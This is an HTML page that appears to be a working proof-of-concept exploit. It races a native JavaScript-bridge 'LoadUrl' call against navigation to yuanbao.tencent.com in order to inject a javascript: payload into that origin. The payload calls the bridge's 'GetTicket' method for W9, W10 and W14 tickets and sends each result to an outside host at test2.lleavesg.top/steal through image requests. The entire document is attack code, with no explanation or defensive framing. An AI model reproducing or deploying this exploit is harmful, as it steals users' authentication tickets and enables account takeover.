<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Race GetTicket</title></head>
<body>
<h2>Race - GetTicket Steal (W9/W10/W14)</h2>
<pre id="log" style="font-size:10px;"></pre>
<script>
var log = document.getElementById('log');
function addLog(s) { log.textContent += '[' + Date.now() + '] ' + s + '\n'; }

var EXFIL = 'https://test2.lleavesg.top/steal';

var js = 'javascript:void('
    + 'window._w9=function(d){new Image().src="' + EXFIL + '?t=w9&d="+encodeURIComponent(d)},'
    + 'window._w10=function(d){new Image().src="' + EXFIL + '?t=w10&d="+encodeURIComponent(d)},'
    + 'window._w14=function(d){new Image().src="' + EXFIL + '?t=w14&d="+encodeURIComponent(d)},'
    + 'JSCallJavaMgr.JSCallNative(JSON.stringify({callback:"_w9",module:"CommonPlugin",method:"GetTicket",param:{type:"W9"},callId:"w9"})),'
    + 'JSCallJavaMgr.JSCallNative(JSON.stringify({callback:"_w10",module:"CommonPlugin",method:"GetTicket",param:{type:"W10"},callId:"w10"})),'
    + 'JSCallJavaMgr.JSCallNative(JSON.stringify({callback:"_w14",module:"CommonPlugin",method:"GetTicket",param:{type:"W14"},callId:"w14"}))'
    + ')';

var c = 0;
function sendOne() {
    c++;
    var req = JSON.stringify({
        callback: 'cb_' + c,
        module: 'CommonPlugin',
        method: 'LoadUrl',
        param: {url: js},
        callId: 'c' + c
    });
    JSCallJavaMgr.JSCallNative(req);
}

function doRace() {
    if (!window.JSCallJavaMgr) { addLog('ERROR'); return; }
    addLog('URL: ' + location.href);
    addLog('Payload: ' + js.length + ' chars');

    location.href = "https://yuanbao.tencent.com/";

    for (var i = 0; i < 500; i++) {
        try { sendOne(); } catch(e) { break; }
    }

    for (var d = 0; d <= 500; d += 50) {
        (function(delay) {
            setTimeout(function() {
                for (var j = 0; j < 50; j++) {
                    try { sendOne(); } catch(e) { return; }
                }
            }, delay);
        })(d);
    }

    addLog('Phase1: ' + c + ' calls');
}

setTimeout(function() {
    addLog('Starting in 2s...');
    setTimeout(doRace, 2000);
}, 500);
</script>
</body>
</html>
